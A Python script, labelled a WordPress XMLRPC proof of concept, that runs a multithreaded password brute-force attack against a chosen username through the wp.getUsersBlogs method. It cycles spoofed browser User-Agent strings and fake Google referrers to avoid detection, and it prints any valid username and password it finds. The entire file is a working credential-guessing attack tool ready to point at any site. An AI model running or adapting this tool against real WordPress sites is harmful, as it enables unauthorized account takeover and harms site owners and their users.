#!/usr/bin/env python3

import argparse
from queue import Queue
import threading
import requests
import atexit
from time import time
import random


class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class XMLRPCBruteForce:
    def __init__(self, url, username, password_file, num_threads):
        self.url = url
        self.username = username
        self.password_file = password_file
        self.num_threads = num_threads
        self.passwords = []
        self.q = Queue()
        self.load_passwords()
        self.headers_useragents = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
        ]

    def load_passwords(self):
        with open(self.password_file, 'r', encoding='UTF-8') as f:
            self.passwords = [line.strip() for line in f]

    def set_headers(self):
        referrer = ''.join([chr(random.randint(65, 90)) for i in range(0, random.randint(5, 10))])
        headers = {
            'Host': self.url.split('/xmlrpc.php')[0].split('//')[1],
            'User-Agent': random.choice(self.headers_useragents),
            'Cache-Control': 'no-cache',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Origin': 'https://www.google.com',
            'Referer': f"https://www.google.com/?q={referrer}",
            'Keep-Alive': str(random.randint(110,120)),
            'content-type': 'text/xml;charset=UTF-8',
            'Connection': 'keep-alive'
            }
        return headers

    def request_xmlrpc(self, username, password):
        data = f"<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>"
        response = requests.post(self.url, data=data.encode('utf-8'), headers=self.set_headers())
        if response.status_code == 200:
            if "isAdmin" in response.text:
                print(f"{colors.OKGREEN}\n Success: '{username}:{password}' {colors.ENDC}")
                atexit.register(exit)

    def worker(self):
        while True:
            item = self.q.get()
            self.request_xmlrpc(self.username, item)
            self.q.task_done()

    def start(self):
        for i in range(self.num_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
        
        start_time = time()

        for password in self.passwords:
            self.q.put(password)

        self.q.join()
        end_time = time()
        print(f"{colors.RED}\n {len(self.passwords)} passwords tested in {end_time - start_time:.2f} seconds {colors.ENDC}")

def banner(url, user, password_file, thread_count):
    print(f"{colors.HEADER}       __   __   __   __   __   ___  __   __                        __   __   __  {colors.ENDC}")
    print(f"{colors.HEADER} |  | /  \ |__) |  \ |__) |__) |__  /__` /__`    \_/  |\/| |    __ |__) |__) /  ` {colors.ENDC}")
    print(f"{colors.HEADER} |/\| \__/ |  \ |__/ |    |  \ |___ .__/ .__/    / \  |  | |___    |  \ |    \__, {colors.ENDC}")
    print(f"{colors.OKBLUE}\n >>> Password brute-forcing through `wp.getUsersBlogs` methodcall {colors.ENDC}")
    print(f"{colors.WARNING}\n Target:\t{url} {colors.ENDC}")
    print(f"{colors.WARNING} User:\t\t{user} {colors.ENDC}")
    print(f"{colors.WARNING} Passlist:\t{password_file} {colors.ENDC}")
    print(f"{colors.WARNING} Threads:\t{thread_count} {colors.ENDC}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='WordPress XMLRPC PoC')
    parser.add_argument('-u', '--url', required=True, help='The XMLRPC endpoint')
    parser.add_argument('-U', '--username', required=True, help='The username to attack')
    parser.add_argument('-P', '--passwords-file', required=True, help='File containing passwords, one per line')
    parser.add_argument('-t', '--threads', default=10, type=int, help='Number of threads to use')
    args = parser.parse_args()

    banner(args.url, args.username, args.passwords_file, args.threads)

    attack = XMLRPCBruteForce(args.url, args.username, args.passwords_file, args.threads)
    attack.start()
